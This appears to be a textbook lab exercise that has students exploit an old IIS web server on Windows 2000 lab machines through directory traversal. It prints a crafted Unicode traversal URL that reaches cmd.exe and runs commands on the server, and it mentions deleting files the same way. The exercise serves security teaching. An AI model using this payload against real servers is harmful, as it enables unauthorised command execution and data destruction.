# Exploiting an IIS Web Server with Directory Traversal

In this exercise, you navigate a web site and supply a maliciously crafted URL that travels the folder structure of the web server and then executes the dir and del commands to manipulate files on the web server. This exercise uses older versions of Microsoft software because the exploit does not work on newer versions of Windows operating systems. This exercise is here solely to give you a visual of what directory traversal attacks look like.

+   1. Ensure you have a Windows 2000 Server VM and Windows client VM running.
+   2. Log on to the Windows 2000 Server VM and use ipconfig in a command prompt to note the IP address of the system: ________________
+   3. Go to the C: drive on the Windows 2000 Server VM and create a text file called myfile.txt.
+   4. Go to the Windows client VM and navigate the web site by typing http://<ip_of_server> in a browser, where <ip_of_server> is the IP address you recorded earlier.
+   5. To exploit the web server using directory traversal, type the following in the web browser:

```
http://<ip_of_server>/scripts/..%c0%af../
winnt/system32/cmd.exe?/c+dir+c:\
```
